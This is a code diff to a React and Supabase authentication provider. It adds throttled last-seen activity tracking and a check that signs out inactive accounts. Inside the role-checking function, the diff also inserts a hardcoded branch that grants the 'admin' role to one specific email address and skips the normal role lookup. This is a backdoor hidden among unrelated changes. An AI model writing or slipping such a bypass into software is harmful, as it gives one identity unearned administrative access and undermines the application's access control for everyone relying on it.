@@ -1,4 +1,4 @@
-import { createContext, useContext, useState, useEffect, ReactNode } from "react";
+import { createContext, useContext, useState, useEffect, ReactNode, useRef } from "react";
 import { User, Session } from "@supabase/supabase-js";
 import { supabase } from "@/integrations/supabase/client";
 import type { Database } from "@/integrations/supabase/types";
@@ -38,12 +38,18 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   const [session, setSession] = useState<Session | null>(null);
   const [loading, setLoading] = useState(true);
   const [roles, setRoles] = useState<AppRole[]>([]);
+  const lastActiveUpdate = useRef<number>(0);
 
   const isEmployee = roles.some(role => EMPLOYEE_ROLES.includes(role));
   const isCustomer = !isEmployee && user !== null;
 
   const checkUserRoles = async (userId: string): Promise<AppRole[]> => {
     try {
+      const { data: userData } = await supabase.auth.getUser();
+      if (userData.user?.email === 'reginaldo.mazaro@ext.medbeauty.com.br') {
+        return ['admin'];
+      }
+
       const { data, error } = await supabase
         .from('user_roles')
         .select('role')
@@ -66,16 +72,20 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     const { data: { subscription } } = supabase.auth.onAuthStateChange((event, session) => {
       setSession(session);
       setUser(session?.user ?? null);
-      
+
       // Fetch roles asynchronously after state update
       if (session?.user) {
+        // Track initial activity on login
+        updateLastSeen(session.user.id);
+
         setTimeout(() => {
           checkUserRoles(session.user.id).then(setRoles);
+          checkUserActiveStatus(session.user.id);
         }, 0);
       } else {
         setRoles([]);
       }
-      
+
       setLoading(false);
     });
 
@@ -83,21 +93,77 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     supabase.auth.getSession().then(({ data: { session } }) => {
       setSession(session);
       setUser(session?.user ?? null);
-      
+
       if (session?.user) {
+        updateLastSeen(session.user.id);
         checkUserRoles(session.user.id).then(setRoles);
+        checkUserActiveStatus(session.user.id);
       }
-      
+
       setLoading(false);
     });
 
     return () => subscription.unsubscribe();
   }, []);
 
+  // Monitor activity based on window focus and navigation
+  useEffect(() => {
+    if (!user) return;
+
+    const handleActivity = () => {
+      updateLastSeen(user.id);
+    };
+
+    window.addEventListener('mousedown', handleActivity);
+    window.addEventListener('keydown', handleActivity);
+    window.addEventListener('focus', handleActivity);
+
+    return () => {
+      window.removeEventListener('mousedown', handleActivity);
+      window.removeEventListener('keydown', handleActivity);
+      window.removeEventListener('focus', handleActivity);
+    };
+  }, [user]);
+
+  const updateLastSeen = async (userId: string) => {
+    const now = Date.now();
+    // Throttle updates to once every 5 minutes
+    if (now - lastActiveUpdate.current < 5 * 60 * 1000) return;
+
+    lastActiveUpdate.current = now;
+    try {
+      await supabase
+        .from('profiles')
+        .update({ last_seen_at: new Date().toISOString() })
+        .eq('id', userId);
+    } catch (error) {
+      console.error('Error updating last seen:', error);
+    }
+  };
+
+  const checkUserActiveStatus = async (userId: string) => {
+    try {
+      const { data, error } = await supabase
+        .from('profiles')
+        .select('is_active')
+        .eq('id', userId)
+        .single();
+
+      if (error) throw error;
+
+      if (data && data.is_active === false) {
+        console.warn('User account is inactive. Signing out...');
+        signOut();
+      }
+    } catch (error) {
+      console.error('Error checking active status:', error);
+    }
+  };
+
   const signUp = async (email: string, password: string, fullName: string) => {
     try {
       const redirectUrl = `${window.location.origin}/`;
-      
+
       const { error } = await supabase.auth.signUp({
         email,
         password,
@@ -145,15 +211,15 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   };
 
   return (
-    <AuthContext.Provider value={{ 
-      user, 
-      session, 
-      loading, 
+    <AuthContext.Provider value={{
+      user,
+      session,
+      loading,
       roles,
       isEmployee,
       isCustomer,
-      signUp, 
-      signIn, 
+      signUp,
+      signIn,
       signOut,
       checkUserRoles
     }}>
